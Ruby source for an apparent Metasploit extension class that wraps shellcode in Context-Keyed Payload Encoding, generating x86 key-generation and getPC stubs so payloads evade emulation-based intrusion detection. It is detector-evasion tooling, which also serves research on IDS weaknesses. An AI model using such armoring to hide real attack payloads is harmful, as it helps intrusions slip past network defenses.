# -*- coding: binary -*-

# =============================================================
# Context-Keyed Payload Encoding armoring class
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'ebnids/keygen'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # Anti-emulation armoring class using CKPE
  class CKPEArmor < AntiEmulArmor

    @@keyReg

    def initialize
      super(
        'Name'             => 'CKPE',  
        'ID'               => 14,             
        'Description'      => 'Anti-emulation armor using Context-Keyed Payload Encoding',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # Overriden method to fill key registery
    # No returned code here because this is handled by getPCStub as key generation for CKPE has to precede getPC code
    #
    def fillKeyReg(keyReg, keyVal)
      @@keyReg = keyReg
      return ""
    end

    #
    # Generates context-key encoded getPC stub and keygen stub
    #
    #
    # [*] Note:
    #       - While implementation could be more gracefully handled by using/extending existing EnableContextEncoding functionality, 
    #         it was decided that we wanted to broadly support all possible types of CKPE encoders, including ones where automatic finding
    #         of keys (as done by find_context_key's scanning of memory maps) was either inefficient or impossible and as such 
    #         settled for user-supplied CKPE keys.
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']
      data = @module_metadata['datastore']
      key = data['CKPE_KEY'].hex

      keyGenStub = Ebnids::KeyGen.keyGen(@@keyReg, data, badchars) +
                   Rex::Arch::X86.push_reg(@@keyReg) # generate key to keyReg, push keyReg

      getPCStub = Ebnids::GetPCStub.encodedStackGetPC(getPCDestReg, badchars, key, @@keyReg) + # execute getPC code
                  Rex::Arch::X86.pop_dword(@@keyReg) + # first pop to compensate for pushing of getPC code by stub generated by encodedStackGetPC
                  Rex::Arch::X86.pop_dword(@@keyReg) + # restore keyReg
                  Rex::Arch::X86.sub(-5, getPCDestReg, badchars, false, true) # adjust for additional bytes

      return keyGenStub + getPCStub
    end

  end

end
